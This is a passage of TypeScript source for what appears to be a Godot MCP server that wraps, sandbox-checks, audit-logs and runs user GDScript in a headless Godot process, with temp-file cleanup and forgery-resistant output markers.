 *  The current implementation uses Node.js `randomUUID()` (backed by crypto.randomUUID),
 *  and takes the full 32-hex de-hyphenated UUID — the v4 version/variant bits are fixed,
 *  so the effective entropy is 122 bits, sufficient to prevent marker prediction.
 *  (2026-09-19 批1修正: 此前 substring(0,16) 实际只有 64 bit,与旧注释"122 bits"不符;
 *   parseMcpMarkers 前缀匹配长度无关,加长无兼容影响。)
 *
 *  DO NOT replace with Math.random(), timestamp-based, or any deterministic generator,
 *  and DO NOT truncate below 32 hex chars without re-evaluating the entropy budget.
 *  If this contract is violated, GDScript code could forge MCP output markers and
 *  inject false results into tool responses. */
function generateMarker(): string {
  return `__MCP_${randomUUID().replace(/-/g, '').substring(0, 32)}__`;
}

// ─── Temp file helpers ──────────────────────────────────────────────────────

const BASE_TMP_DIR = join(tmpdir(), 'godot-mcp-exec');
let baseDirPromise: Promise<void> | null = null;

async function ensureBaseDir(): Promise<void> {
  baseDirPromise ??= mkdir(BASE_TMP_DIR, { recursive: true, mode: 0o700 })
    .then(() => {})
    .catch((err) => {
      baseDirPromise = null;  // C-01: clear cache on failure so next call retries
      throw err;
    });
  return baseDirPromise;
}

/** Create an isolated session directory for one execution */
async function createSessionDir(): Promise<string> {
  await ensureBaseDir();
  // A-02: 嵌入时间戳到目录名，cleanupOldSessions 解析文件名判断过期（不依赖 mtime）
  return mkdtemp(join(BASE_TMP_DIR, `${TMP_PREFIX}${Date.now()}-`));
}

/** Background cleanup: remove session dirs and staging dirs older than 1 hour */
async function cleanupOldSessions(): Promise<void> {
  if (!baseDirPromise) return;
  const maxAge = 60 * 60 * 1000;
  const now = Date.now();
  // IMPORTANT-11 (review): try 移入循环内,retryRm 失败不再中断整个循环(原中断致每次只清
  // 第一个失败目录,残留累积)。EPERM/EBUSY 失败收集后聚合 1 条(降噪:原每目录 1 条)。
  let entries: string[];
  try {
    entries = await readdir(BASE_TMP_DIR);
  } catch (err) {
    getLogger().debug('gdscript', `cleanup stale dirs: readdir failed: ${err}`);
    return;
  }
  const lockFailures: string[] = [];
  // IMPORTANT-11: 单次清理上限防卡——累积多时每目录 retryRm 退避(最坏 1.2s)拖慢 gdscript 执行。
  // 超出目录下次 cleanup 兜底(1h TTL,不丢)。
  const MAX_CLEANUP_PER_RUN = 10;
  // IMPORTANT-12 (38s flaky 根治): 单次 cleanup 总耗时上限。staging 累积时 retryRm 每目录最坏
  // 1.2s 退避,仅 MAX_CLEANUP_PER_RUN=10 仍可阻塞 ~12s;累积更多(实测 31 个)叠加每次
  // executeGdscript 触发的 cleanup 致 P3 偶发 38s。加 2s 预算,超时停止本次,残留下次兜底(1h TTL)。
  const CLEANUP_BUDGET_MS = 2000;
  let attempts = 0; // 计尝试(含 EPERM 失败),防 staging 全 EPERM 时 for 全遍历阻塞主路径
  for (const entry of entries) {
    if (attempts >= MAX_CLEANUP_PER_RUN) break;
    if (Date.now() - now > CLEANUP_BUDGET_MS) break;
    // I-02: Also clean up staging dirs (renamed by retryRm on Windows)
    if (!entry.startsWith(TMP_PREFIX) && !entry.startsWith('_staging_')) continue;
    try {
      const dirPath = join(BASE_TMP_DIR, entry);
      const stat = await lstat(dirPath);
      if (stat.isSymbolicLink()) continue;
      // A-02: 优先解析文件名中的时间戳；回退到 mtime（兼容旧格式目录）
      let dirAge: number;
      // 全仓审查 M-1 (2026-09-12): mkdtemp 在前缀后追加 6 随机字符,目录名以随机后缀收尾,
      // 原 /-(\d+)-$/ 要求"数字段+-"收尾永不匹配(A-02 文件名解析从未生效,恒走 mtime 兜底)。
      // 改为前缀锚定提取时间戳段(引用 TMP_PREFIX 防常量漂移)。
      const tsMatch = entry.match(new RegExp(`^${TMP_PREFIX}(\\d+)-`));
      if (tsMatch) {
        dirAge = now - parseInt(tsMatch[1]!);
      } else {
        dirAge = now - stat.mtimeMs;
      }
      if (stat.isDirectory() && dirAge > maxAge) {
        // A-07: Retry rm on EPERM/EBUSY (Windows file locking) with backoff
        attempts++;
        await retryRm(dirPath);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      if (msg.includes('EPERM') || msg.includes('EBUSY')) {
        lockFailures.push(entry); // 聚合,不逐条打
      } else {
        getLogger().debug('gdscript', `cleanup stale dirs: ${msg}`);
      }
    }
  }
  if (lockFailures.length > 0) {
    getLogger().debug('gdscript', `cleanup stale dirs: ${lockFailures.length} 个 staging 目录清理失败(EPERM/EBUSY,Windows 句柄占用),待下次 cleanup 兜底`);
  }
}

/** A-07: Retry rm with backoff for EPERM/EBUSY errors on Windows.
 *  P-1: On Windows, first attempt rename to a staging dir, then delete from there.
 *  This avoids EPERM from Godot still holding file handles on the original path. */
async function retryRm(dirPath: string, maxRetries = 3): Promise<void> {
  // P-1: Windows rename-to-staging strategy
  if (process.platform === 'win32') {
    try {
      const stagingName = join(BASE_TMP_DIR, `_staging_${Date.now()}_${randomUUID().slice(0, 8)}`);
      const { rename: renameAsync } = await import('fs/promises');
      await renameAsync(dirPath, stagingName);
      // Renamed successfully — now delete from staging (less likely to hit EPERM)
      dirPath = stagingName;
    } catch {
      // Rename failed — fall through to normal retry logic on original path
    }
  }
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      await rm(dirPath, { recursive: true, force: true });
      if (attempt > 0) getLogger().debug('gdscript', `retryRm succeeded on attempt ${attempt + 1}: ${dirPath}`);
      return;
    } catch (err: unknown) {
      const isRetryable = err instanceof Error && 'code' in err &&
        ((err as NodeJS.ErrnoException).code === 'EPERM' || (err as NodeJS.ErrnoException).code === 'EBUSY');
      if (!isRetryable || attempt === maxRetries) throw err;
      // I-LOG: 静默重试 EPERM/EBUSY（Windows 上 Godot 进程退出后短暂持有 .gd 句柄，
      // 每次执行必现）。逐次 attempt 日志会淹没测试输出与覆盖率摘要（IMPORTANT-3）。
      // 最终失败由调用方 catch 聚合记录；staging 目录由 cleanupOldSessions 在下次
      // 执行时兜底清理（已有机制，1 小时 TTL）。
      await new Promise(r => setTimeout(r, 200 * (attempt + 1)));
    }
  }
}

async function writeTempScript(code: string, sessionDir: string): Promise<string> {
  const id = randomUUID().replace(/-/g, '').substring(0, 8);
  const filePath = join(sessionDir, `${id}.gd`);
  // I-24: POSIX — mode 0o600 restricts to owner read/write only
  await writeFile(filePath, code, { encoding: 'utf-8', mode: 0o600 });
  // I-S5: Restrict file permissions on Windows (icacls overrides POSIX mode)
  if (process.platform === 'win32') {
    try {
      const { execFileSync } = await import('node:child_process');
        // C-ARC-01: Validate username strictly (no backslash injection), use :M not :F
        // (批 K 2026-08-16: 与 5968a03/editor-auth 同款 —— :R 只读残留会让后续重写/删除
        // 临时 .gd 失败,仅累积 tmpdir 垃圾;:M 允许写删但不给改 ACL 的完全控制)
        const winUser = userInfo().username;
        if (winUser && /^[A-Za-z0-9_-]+$/.test(winUser)) {
          execFileSync('icacls', [filePath, '/inheritance:r', '/grant:r', `${winUser}:M`], { windowsHide: true });
      }
    } catch { /* non-critical: best-effort permission restriction */ }
  }
  return filePath;
}

async function writeSessionFile(content: string, ext: string, sessionDir: string): Promise<string> {
  const id = randomUUID().replace(/-/g, '').substring(0, 8);
  const filePath = join(sessionDir, `${id}${ext}`);
  await writeFile(filePath, content, { encoding: 'utf-8', mode: 0o600 });
  return filePath;
}

// ─── Code wrapping ──────────────────────────────────────────────────────────

/**
 * Detect if the code is a "full class" (contains `extends`)
 * or a "snippet" that needs auto-wrapping.
 */
export function isFullClass(code: string): boolean {
  // Match `extends` at the start of a line (ignoring whitespace and comments)
  return /^\s*extends\s+/m.test(code);
}

/**
 * Classify GDScript code lines into declarations (class-level) and statements.
 * Declarations include func, var, const, signal, enum, class_name, and annotations.
 * Statements go into _initialize() body.
 */
function classifyLines(code: string): { declarationLines: string[]; statementLines: string[] } {
  // Normalize CRLF → LF so \r doesn't leak into line content and break GDScript parsing
  const lines = code.replace(/\r\n/g, '\n').replace(/\r/g, '\n').split('\n');
  const declarationLines: string[] = [];
  const statementLines: string[] = [];

  let inFuncBody = false;
  for (const line of lines) {
    const trimmed = line.trim();

    // Empty lines go to statement group
    if (trimmed === '') {
      if (inFuncBody) {
        declarationLines.push(line);
      }
      continue;
    }

    // Comment-only lines at top level go to declarations
    if (trimmed.startsWith('#') && !inFuncBody) {
      declarationLines.push(line);
      continue;
    }

    // Top-level declarations: func, var, const, signal, enum, class_name, annotations
    // Only classify as declaration if the line starts at column 0 (no indentation).
    // Indented var/const inside if/while/for blocks are local, not class-level.
    if (/^[^\t ]/.test(line) && /^(func |static func |var |const |signal |enum |class_name |@export|@onready|@icon|@warning)/.test(trimmed)) {
      declarationLines.push(line);
      if (/^(static )?func /.test(trimmed)) {
        inFuncBody = true;
      }
      // Multi-line lambda: var x = func(): / var x = func(args):
      // Body lines must stay with the declaration, not go to _initialize().
      if (/=\s*func\s*\(.*\)\s*:\s*$/.test(trimmed)) {
        inFuncBody = true;
      }
      continue;
    }

    // Lines indented under a func declaration are part of that func body.
    // A top-level (column-0) non-comment line ends the func body.
    // Comment lines at column 0 are intentionally allowed inside func bodies —
    // they don't constitute a new top-level construct.
    if (inFuncBody) {
      if (/^[^\t ]/.test(line) && !trimmed.startsWith('#')) {
        inFuncBody = false;
        // Fall through to statement classification below
      } else {
        declarationLines.push(line);
        continue;
      }
    }

    // Everything else is a statement
    statementLines.push(line);
  }

  // Normalize leading spaces → tabs so wrapper's \t prefix doesn't create mixed indentation
  _normalizeIndentToTabs(declarationLines);
  _normalizeIndentToTabs(statementLines);

  return { declarationLines, statementLines };
}

/** Normalize leading spaces to tabs in-place via the shared implementation. */
function _normalizeIndentToTabs(lines: string[]): void {
  const normalized = _sharedNormalizeIndent(lines.join('\n'));
  const result = normalized.split('\n');
  for (let i = 0; i < lines.length; i++) {
    lines[i] = result[i] ?? lines[i]!;
  }
}

/**
 * Wrap a snippet into a valid `extends SceneTree` script with helper functions.
 * Splits user code into declarations (class-level) and statements (inside _initialize).
 * This allows func/var/const definitions to work correctly at class scope.
 */
export function wrapSnippet(code: string, resultMarker = MARKER_RESULT_SHARED): string {
  const { declarationLines, statementLines } = classifyLines(code);

  // BUG-2 fix: SceneTree has a built-in `root` property (Window).
  // User `var root = ...` at class level collides with it.
  // Rename user's `var root` → `var _mcp_user_root` and update references.
  const ST_RESERVED = ['root'];
  for (const reserved of ST_RESERVED) {
    // Step 1: Rename declaration `var root =` → `var _mcp_user_root =`
    // Also covers `var root: Type = ...` and `var root` (no initializer)
    const declPattern = new RegExp(`^(var\\s+)${reserved}\\b`, 'g');
    for (let i = 0; i < declarationLines.length; i++) {
      declarationLines[i] = declarationLines[i]!.replace(declPattern, `$1_mcp_user_${reserved}`);
    }
    // Step 2: Update references in both declarationLines and statementLines.
    // _mcp_user_root contains 'root' but is preceded by '_' so refPattern won't match it.
    const refPattern = new RegExp(`(?<![_.\\w])\\b${reserved}\\b(?!\\w)`, 'g');
    for (let i = 0; i < declarationLines.length; i++) {
      declarationLines[i] = declarationLines[i]!.replace(refPattern, `_mcp_user_${reserved}`);
    }
    for (let i = 0; i < statementLines.length; i++) {
      statementLines[i] = statementLines[i]!.replace(refPattern, `_mcp_user_${reserved}`);
    }
  }

  // Build via array join — prevents JS template interpolation of user code
  const scriptLines: string[] = [
    'extends SceneTree',
    '## MCP snippet mode — autoloads are NOT available unless load_autoloads=true',
    '## Use Variant type for variables to avoid "Cannot infer type" errors',
    '',
    'var _mcp_outputs: Array = []',
    '# Note: _mcp_root named to avoid collision with SceneTree.root (Godot 4.6+)',
    'var _mcp_root: Node = null',
    '',
    ...GD_MCP_GET_ROOT,
    '',
    ...GD_MCP_GET_NODE,
    '',
    ...GD_MCP_LOAD_MAIN_SCENE,
    '',
    ...GD_MCP_OUTPUT,
    '',
    'func _mcp_done() -> void:',
    '\tprint("' + resultMarker + '" + JSON.stringify({"success": true, "outputs": _mcp_outputs}))',
    '\tif Engine.get_main_loop() == self:',
    '\t\tquit(0)',
  ];
  // User code — safe: array join does not interpolate dollar-brace or backticks
  if (declarationLines.length > 0) {
    scriptLines.push('');
    scriptLines.push(...declarationLines);
    scriptLines.push('');
  }

  scriptLines.push(
    'func _initialize():',
    '\t_mcp_load_main_scene()',
  );

  if (statementLines.length > 0) {
    for (const l of statementLines) {
      scriptLines.push('\t' + l);
    }
  }

  scriptLines.push(
    '\tprint("' + resultMarker + '" + JSON.stringify({"success": true, "outputs": _mcp_outputs}))',
    '\tif Engine.get_main_loop() == self:',
    '\t\tquit(0)',
  );

  return scriptLines.join('\n') + '\n';
}

/**
 * Wrap a snippet as `extends Node` for autoload mode.
 * The loader scene instantiates this via .new(), so it must be a Node subclass.
 */
export function wrapSnippetAsNode(code: string, resultMarker = MARKER_RESULT_SHARED): string {
  const { declarationLines, statementLines } = classifyLines(code);

  // Rename user's _initialize to _mcp_user_init to avoid collision with our _initialize
  for (let i = 0; i < declarationLines.length; i++) {
    declarationLines[i] = declarationLines[i]!.replace(/func _initialize\(/g, "func _mcp_user_init(");
  }
  const hasUserInit = /func _mcp_user_init\(/.test(declarationLines.join('\n'));

  // Node context variant: uses get_tree().root instead of self.root
  const GD_MCP_GET_ROOT_AS_NODE: readonly string[] = [
    'func _mcp_get_root() -> Node:',
    '\tif _mcp_root != null:',
    '\t\treturn _mcp_root',
    '\tvar _tree = get_tree()',
    '\tif _tree != null and _tree.root != null:',
    '\t\t_mcp_root = _tree.root',
    '\t\treturn _mcp_root',
    '\treturn null',
  ];

  // Build via array join — prevents JS template interpolation of user code
  const nodeLines: string[] = [
    'extends Node',
    '## MCP autoload snippet mode — runs as Node child in loader scene',
    '',
    'var _mcp_outputs: Array = []',
    'var _mcp_root: Node = null',
    '',
    ...GD_MCP_GET_ROOT_AS_NODE,
    '',
    ...GD_MCP_OUTPUT,
    '',
    'func _mcp_done() -> void:',
    '\tprint("' + resultMarker + '" + JSON.stringify({"success": true, "outputs": _mcp_outputs}))',
    '\tvar _tree = get_tree()',
    '\tif _tree != null:',
    '\t\t_tree.quit(0)',
  ];

  // User code — safe: array join does not interpolate dollar-brace or backticks
  if (declarationLines.length > 0) {
    nodeLines.push('');
    nodeLines.push(...declarationLines);
    nodeLines.push('');
  }

  nodeLines.push('func _initialize() -> void:');
  if (statementLines.length > 0) {
    for (const l of statementLines) {
      nodeLines.push('\t' + l);
    }
  }
  if (hasUserInit) {
    nodeLines.push('\t_mcp_user_init()');
  }
  nodeLines.push('\t_mcp_done()');

  return nodeLines.join('\n') + '\n';
}

/**
 * For full class mode, inject helper functions and result reporting.
 */
export function injectHelpers(code: string): string {
  // Add helper variables at the top (after extends line)
  const lines = code.split('\n');
  const extendsIdx = lines.findIndex(l => /^\s*extends\s+/.test(l));

  // Skip injection if the code already declares these helpers (exclude comment lines)
  const hasOutputsVar = lines.some(l => /^\s*var\s+_mcp_outputs\s*:/.test(l) && !l.trim().startsWith('#'));
  const hasOutputFunc = lines.some(l => /^\s*func\s+_mcp_output\s*\(/.test(l) && !l.trim().startsWith('#'));
  const hasDoneFunc = lines.some(l => /^\s*func\s+_mcp_done\s*\(/.test(l) && !l.trim().startsWith('#'));

  const helperLines: string[] = [''];
  if (!hasOutputsVar) {
    helperLines.push('var _mcp_outputs: Array = []', '');
  }
  if (!hasOutputFunc) {
    helperLines.push('func _mcp_output(key: String, value: Variant) -> void:', '\t_mcp_outputs.append({"key": key, "value": str(value)})', '');
  }
  if (!hasDoneFunc) {
    helperLines.push(
      'func _mcp_done() -> void:',
      '\tprint("' + MARKER_RESULT_SHARED + '" + JSON.stringify({"success": true, "outputs": _mcp_outputs}))',
      '\tif Engine.get_main_loop() == self:',
      '\t\tquit(0)',
      '',
    );
  }

  const result = [...lines.slice(0, extendsIdx + 1), ...helperLines, ...lines.slice(extendsIdx + 1)];
  return result.join('\n');
}

// ─── Output parsing ─────────────────────────────────────────────────────────

export function parseMcpMarkers(raw: string, resultMarker = MARKER_RESULT_SHARED, errorMarker = MARKER_ERROR_SHARED): {
  parsed: { success: boolean; outputs?: OutputEntry[]; error?: string } | null;
  logLines: string[];
} {
  const lines = raw.split('\n');
  const logLines: string[] = [];
  let parsed: { success: boolean; outputs?: OutputEntry[]; error?: string } | null = null;

  for (const line of lines) {
    const trimmed = line.trim();
    if (trimmed.startsWith(resultMarker)) {
      try {
        parsed = JSON.parse(trimmed.substring(resultMarker.length));
      } catch {
        parsed = { success: false, error: 'Failed to parse result JSON: ' + trimmed };
      }
    } else if (trimmed.startsWith(errorMarker)) {
      try {
        parsed = JSON.parse(trimmed.substring(errorMarker.length));
      } catch {
        parsed = { success: false, error: 'Failed to parse error JSON: ' + trimmed };
      }
    } else {
      logLines.push(trimmed);
    }
  }

  return { parsed, logLines };
}

// ─── Main execution function ────────────────────────────────────────────────

export async function executeGdscript(
  options: ExecuteGdscriptOptions
): Promise<ExecuteGdscriptResult> {
  const { godotPath, projectPath, timeout = 30 } = options;
  let code = options.code;
  // 全仓审查 I-1 处置记录 (2026-09-12): 曾按审查建议 scrub 用户代码中的 marker 固定常量,
  // 实测撤销——固定常量 ___MCP_RESULT___/___MCP_ERROR___ 是 C-09 的**公开协议契约**(测试模板
  // /helper/生成器统一"写常量、server replaceAll 换随机 marker",ui-layout 等 full-class
  // 测试即依赖此机制),scrub 破坏契约致结构化输出解析全断。威胁模型重审:单脚本内的输出
  // 控制权本属脚本作者(marker 防的是跨执行/重放伪造,非当次);execute 通道输出的注入防御
  // 由 untrusted 信封(M-3)承担。审查发现降级为设计声明,不构成漏洞。
  let loadAutoloads = options.loadAutoloads ?? false;
  let autoloadDetected: string[] | undefined;

  // Autoload auto-detection: scan code for autoload references when not explicitly set
  if (options.loadAutoloads === undefined) {
    const autoloadNames = parseAutoloadNames(projectPath);
    const matched = detectAutoloadUsage(code, autoloadNames);
    if (matched.length > 0) {
      loadAutoloads = true;
      autoloadDetected = matched;
      getLogger().info('gdscript', `Auto-detected autoload usage: ${matched.join(', ')}. Enabled load_autoloads.`);
    }
  }
  const startTime = Date.now();

  // P2-4: orphan bridge autoload 前置自愈——残留条目+脚本已删会让每次 headless 操作崩
  if (repairOrphanedBridgeAutoload(projectPath)) {
    getLogger().warn('gdscript', `Repaired orphaned McpBridge autoload entry in ${projectPath} (script missing) — removed the dangling entry.`);
  }

  // Warn if same project is being used by a running game process
  // 设计 §4.5 I-3:按目标桶判定(getRunSessionProc 内部归一化 key)——原活跃桶判定
  // (getProjectDir()+getRunningProcess())在活跃=B 时对运行中的 A 漏报 .godot/ 缓存冲突风险。
  if (getRunSessionProc(projectPath)) {
    getLogger().warn('gdscript', `Warning: project ${projectPath} is also being used by a running game process. Headless execution should be safe but watch for .godot/ cache conflicts.`);
  }

  // Hard kill switch: set ALLOW_EXECUTE_GDSCRIPT=false to disable GDScript execution
  if (process.env.ALLOW_EXECUTE_GDSCRIPT === 'false') {
    return { success: false, compile_success: false, compile_error: 'GDScript execution is disabled (ALLOW_EXECUTE_GDSCRIPT=false)', errors: [], run_success: false, run_error: '', outputs: [], raw_output: '', duration_ms: 0, autoload_detected: autoloadDetected };
  }

  // CMP-11 (2026-08-08): opt-in 审计日志——执行前把完整代码写到独立文件供事后追溯。
  // env GODOT_MCP_AUDIT_CODE=true 开启。字符串字面量脱敏(防 secret 泄露到审计日志)。
  if (process.env.GODOT_MCP_AUDIT_CODE === 'true') {
    try {
      const { appendFileSync } = await import('fs');
      const auditPath = join(resolveLogDir(), 'audit-code.log');
      const sanitized = code.replace(/"[^"\\]*(?:\\.[^"\\]*)*"/g, '"***"'); // 字符串字面量脱敏
      const ts = new Date().toISOString();
      appendFileSync(auditPath, `[${ts}] project=${projectPath} autoloads=${autoloadDetected?.join(',') ?? 'none'}\n${sanitized}\n---\n`);
    } catch { /* best-effort:审计失败不阻断执行 */ }
  }

  // C-SEC-02: Sandbox scan — BLOCKS execution on dangerous patterns by default
  const skipSandbox = (options as unknown as Record<symbol, boolean>)[_trustedSymbol] === true;
  const p3Skip = (options as unknown as Record<symbol, boolean>)[_p3SkipSymbol] === true;
  const sandboxWarnings = skipSandbox ? [] : scanGdscriptSandbox(code, { skipPhase3: p3Skip });
  // C-02: Support both new GODOT_MCP_DISABLE_SAFETY and legacy GODOT_MCP_ALLOW_UNSAFE
  // P0-1 (2026-07-06 RCE 审查): 双开关 — 上述 flag 需同时设 GODOT_MCP_UNRESTRICTED=true 才生效,
  // 防误设单 env 绕过沙箱报警。kill switch (ALLOW_EXECUTE_GDSCRIPT=false, 上方) 优先于此。
  const safetyDisabled = process.env.GODOT_MCP_UNRESTRICTED === 'true'
    && (process.env.GODOT_MCP_DISABLE_SAFETY === 'true' || process.env.GODOT_MCP_ALLOW_UNSAFE === 'true');
  if (sandboxWarnings.length > 0 && !safetyDisabled) {
    return {
      success: false, compile_success: false,
      compile_error: `Sandbox violation: code contains dangerous patterns. Set GODOT_MCP_DISABLE_SAFETY=true + GODOT_MCP_UNRESTRICTED=true to override (P0-1 double-opt-in).\n${sandboxWarnings.join('\n')}`,
      errors: [], run_success: false, run_error: '', outputs: [], raw_output: '', duration_ms: 0, autoload_detected: autoloadDetected,
    };
  }
  if (sandboxWarnings.length > 0 && safetyDisabled) {
    // I-04: 结构化审计事件 — 记录安全绕过的完整上下文（代码摘要、时间戳、触发模式）
    // I-10: Sanitize string literals in code summary to prevent credential leakage
    const rawSummary = code.slice(0, 120).replace(/\n/g, '\\n');
    const codeSummary = rawSummary.replace(/"[^"\\]*(?:\\.[^"\\]*)*"|'[^'\\]*(?:\\.[^'\\]*)*'/g, '"***"');
    getLogger().warn('security', JSON.stringify({
      audit: 'SANDBOX_BYPASS',
      warnings: sandboxWarnings,
      codePreview: codeSummary,
      flag: process.env.GODOT_MCP_DISABLE_SAFETY === 'true' ? 'GODOT_MCP_DISABLE_SAFETY' : 'GODOT_MCP_ALLOW_UNSAFE',
    }));
    getLogger().warn('security', `Safety bypass active — executing despite sandbox warnings: ${sandboxWarnings}`);
    // I-18: Mark execution output so downstream consumers know sandbox was bypassed
    code = '# [UNSANDBOXED] Executing with safety bypass\n' + code;
  }

  // Validate godotPath exists and looks like a Godot binary
  if (!existsSync(godotPath)) {
    return { success: false, compile_success: false, compile_error: `Godot binary not found: ${godotPath}`, errors: [], run_success: false, run_error: '', outputs: [], raw_output: '', duration_ms: 0, autoload_detected: autoloadDetected };
  }
  const binName = basename(godotPath).toLowerCase();
  if (!binName.includes('godot')) {
    return { success: false, compile_success: false, compile_error: `Binary does not appear to be Godot: ${basename(godotPath)}`, errors: [], run_success: false, run_error: '', outputs: [], raw_output: '', duration_ms: 0, autoload_detected: autoloadDetected };
  }

  // P3: Auto-import warmup — ensures .godot/imported/ is fresh before headless execution
  if (needsImport(projectPath)) {
    try {
      getLogger().info('executor', `Running import warmup for ${projectPath}`);
      await runImport(projectPath, godotPath);
    } catch (importErr) {
      getLogger().warn('executor', `Import warmup failed: ${importErr instanceof Error ? importErr.message : importErr}`);
      // Non-fatal — continue execution
    }
  }

  // Acquire short-running slot AFTER all validation — ensures no early-return leaks the slot
  if (!acquireShortRunningSlot()) {
    return { success: false, compile_success: false, compile_error: 'Too many concurrent headless operations (max 3). Please wait and retry.', errors: [], run_success: false, run_error: '', outputs: [], raw_output: '', duration_ms: 0, autoload_detected: autoloadDetected };
  }

  // C-01: Generate random per-execution markers to prevent user code forgery
  const rndResult = generateMarker();
  const rndError = generateMarker();

  // Prepare script content
  // Routing logic:
  // --script mode requires extends SceneTree/MainLoop
  // --scene (autoload) mode uses loader that calls .new(), requires extends Node
  // SceneTree-based scripts (using root/quit/get_node override) CANNOT run as Node,
  // so autoload mode is downgraded to --script for them.
  let scriptContent: string;
  if (isFullClass(code)) {
    const extendsSceneTree = /^\s*extends\s+(SceneTree|MainLoop)/m.test(code);
    if (extendsSceneTree) {
      // SceneTree scripts always use --script mode (root/quit API incompatible with Node)
      loadAutoloads = false;
      scriptContent = injectHelpers(code);
    } else if (loadAutoloads) {
      // Full class extending Node etc. with autoloads → inject helpers, loader calls .new()
      scriptContent = injectHelpers(code);
    } else {
      // Full class extending Node/etc. without autoloads → strip extends, wrap as SceneTree
      const strippedCode = code.replace(/^\s*extends\s+\S+.*\n?/m, '');
      scriptContent = wrapSnippet(strippedCode, rndResult);
    }
  } else if (loadAutoloads) {
    scriptContent = wrapSnippetAsNode(code, rndResult);
  } else {
    scriptContent = wrapSnippet(code, rndResult);
  }

  // C-09: For injectHelpers path, replace fixed markers with random ones
  // (wrapSnippet paths already use random markers via template parameter)
  scriptContent = scriptContent.replaceAll(MARKER_RESULT_SHARED, rndResult);
  scriptContent = scriptContent.replaceAll(MARKER_ERROR_SHARED, rndError);

  // Create isolated session directory
  await cleanupOldSessions();
  const sessionDir = await createSessionDir();

  // Write temp file
  const tempFiles: string[] = [];
  let tempFile: string;
  try {
    tempFile = await writeTempScript(scriptContent, sessionDir);
    tempFiles.push(tempFile);
  } catch (err) {
    releaseShortRunningSlot();
    return {
      success: false,
      compile_success: false,
      compile_error: `Failed to write temp script: ${err}`,
      errors: [],
      run_success: false,
      run_error: '',
      outputs: [],
      raw_output: '',
      duration_ms: Date.now() - startTime,
      autoload_detected: autoloadDetected,
    };
  }

  // Build Godot arguments
  const godotArgs: string[] = ['--headless', '--path', projectPath];
  if (loadAutoloads) {
    // Autoload mode: create a loader scene that initializes all autoloads first
    try {
      // Write loader script first to get its absolute path
      const loaderScriptPath = await writeSessionFile(createAutoloadLoaderScript(tempFile, rndError), '.gd', sessionDir);
      tempFiles.push(loaderScriptPath);
      // Create scene referencing loader script by absolute path (not res://)
      const loaderScene = createAutoloadLoaderScene(loaderScriptPath);
      const loaderScenePath = await writeSessionFile(loaderScene, '.tscn', sessionDir);
      tempFiles.push(loaderScenePath);
      godotArgs.push('--scene', loaderScenePath);
    } catch (err) {
      // C8: retryRm 对齐 timer(:1255)/close(:1269) 分支(Windows EPERM 容错)。spec C8 :1344 同 bug 一并修。
      retryRm(sessionDir).catch(() => {});
      releaseShortRunningSlot();
      return {
        success: false,
        compile_success: false,
        compile_error: `Failed to create autoload loader files: ${err}`,
        errors: [],
        run_success: false,
        run_error: '',
        outputs: [],
        raw_output: '',
        duration_ms: Date.now() - startTime,
        autoload_detected: autoloadDetected,
      };
    }
  } else {
    godotArgs.push('--script', tempFile);
  }

  // C-AUDIT (对照 UE 9b128514): spawn 前留痕——原始 code 的字节级 SHA-256 + executionId，
  // 记 EXECUTE_BEGIN 审计（不含原始 code，对齐 I-10）。崩溃/超时后凭日志反查；executionId/
  // scriptSha256 同时回填到结果（见下方 resolve），便于调用方与日志双向定位。
  const execMode = isFullClass(code)
    ? (loadAutoloads ? 'full_class_autoload' : 'full_class')
    : (loadAutoloads ? 'snippet_autoload' : 'snippet');
  const auditEvent = buildExecAuditEvent({
    code,
    scriptPath: tempFile,
    mode: execMode,
    autoload: loadAutoloads,
  });
  getLogger().info('security', JSON.stringify(auditEvent));
  const { executionId, scriptSha256 } = auditEvent;

  // Spawn Godot process
  return new Promise<ExecuteGdscriptResult>((resolve, reject) => {
    // C-PERF-01: Use Buffer[] to avoid O(n²) string concatenation.
    // Each += on a string copies the entire contents; with 10MB of output
    // this becomes catastrophically slow. Buffers collect chunks and
    // are joined once at close time.
    const stdoutChunks: Buffer[] = [];
    const stderrChunks: Buffer[] = [];
    let stdoutBytes = 0;
    let stderrBytes = 0;

    const MAX_OUTPUT_BYTES = 10 * 1024 * 1024; // 10MB output limit
    let outputExceeded = false;

    const proc = spawn(godotPath, godotArgs, {
      stdio: ['pipe', 'pipe', 'pipe'],
      env: buildSafeEnv(),
    });
    // B-T4: 注册到 _spawnedGodotPids, close/崩溃可清理 in-flight short-running spawn。
    // 原 only-run_project 注册致挂起脚本 + close → 孤儿无兜底; 三路径 forceKillTree 后也需 unregister。
    if (proc.pid) registerSpawnedGodotPid(proc.pid);
    const unregisterSpawn = () => { if (proc.pid) unregisterSpawnedGodotPid(proc.pid); };
    proc.on('exit', unregisterSpawn);   // 正常 exit
    proc.on('error', unregisterSpawn);  // spawn 错误（ENOENT 等）

    proc.stdout?.on('data', (d: Buffer) => {
      if (outputExceeded) return;
      stdoutChunks.push(d);
      stdoutBytes += d.byteLength;
      if (stdoutBytes > MAX_OUTPUT_BYTES) {
        outputExceeded = true;
        // P-2: 截断已有 buffer 到限制内，释放超限内存
        let kept = 0;
        const trimmed: Buffer[] = [];
        for (const chunk of stdoutChunks) {
          if (kept + chunk.byteLength <= MAX_OUTPUT_BYTES) {
            trimmed.push(chunk);
            kept += chunk.byteLength;
          } else {
            const remainder = MAX_OUTPUT_BYTES - kept;
            if (remainder > 0) trimmed.push(chunk.subarray(0, remainder));
            break;
          }
        }
        stdoutChunks.length = 0;
        stdoutChunks.push(...trimmed, Buffer.from('\n[OUTPUT TRUNCATED: exceeded 10MB limit]'));
        forceKillTree(proc);
        unregisterSpawn();  // B-T4: pipe 溢出强杀后注销（exit 事件可能不触发）
      }
    });
    proc.stderr?.on('data', (d: Buffer) => {
      if (outputExceeded) return;
      stderrChunks.push(d);
      stderrBytes += d.byteLength;
      if (stderrBytes > MAX_OUTPUT_BYTES) {
        outputExceeded = true;
        // P-2: 截断已有 buffer 到限制内
        let kept = 0;
        const trimmed: Buffer[] = [];
        for (const chunk of stderrChunks) {
          if (kept + chunk.byteLength <= MAX_OUTPUT_BYTES) {
            trimmed.push(chunk);
            kept += chunk.byteLength;
          } else {
            const remainder = MAX_OUTPUT_BYTES - kept;
            if (remainder > 0) trimmed.push(chunk.subarray(0, remainder));
            break;
          }
        }
        stderrChunks.length = 0;
        stderrChunks.push(...trimmed, Buffer.from('\n[OUTPUT TRUNCATED: exceeded 10MB limit]'));
        forceKillTree(proc);
        unregisterSpawn();  // B-T4: pipe 溢出强杀后注销（exit 事件可能不触发）
      }
    });
